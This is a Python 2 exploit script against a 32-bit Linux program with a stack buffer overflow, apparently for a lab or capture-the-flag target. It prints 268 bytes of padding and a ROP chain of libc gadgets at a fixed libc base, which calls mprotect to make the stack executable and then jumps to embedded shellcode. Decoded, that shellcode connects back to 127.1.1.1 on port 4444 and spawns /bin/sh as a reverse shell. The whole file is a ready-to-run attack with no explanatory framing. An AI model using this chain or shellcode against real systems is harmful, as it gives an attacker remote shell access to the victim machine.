#!/usr/bin/python
import struct


libc_base = 0xf7e05000

def makeAddress(address):
  return struct.pack("<I", libc_base + address)

shellCode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x66\xb8\x6a\x01\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x89\xc2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

junk = "A" * 268

# find exact address with ropper
rop = ""
rop += makeAddress(0x00001aa6)  # pop edx
rop += struct.pack("<I",0xFFFFFFFF)  # val to decrement
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x00025b25)  # inc edx
rop += makeAddress(0x000b4137)  # pop ecx
rop += struct.pack("<I",0x01010101)  # mem max size
rop += makeAddress(0x000183a5)  # pop ebx
rop += struct.pack("<I",0xfffdd001)  # stack address
rop += makeAddress(0x0016ca9e)  # dec ebx
rop += struct.pack("<I",0xf7ee625d)  # call mprotect + 13
rop += struct.pack("<I",0x41414141)  # junk for pop ebx in mprotect
rop += makeAddress(0x00002aa9)  # jmp esp followed by shellCode

print junk + rop + shellCode
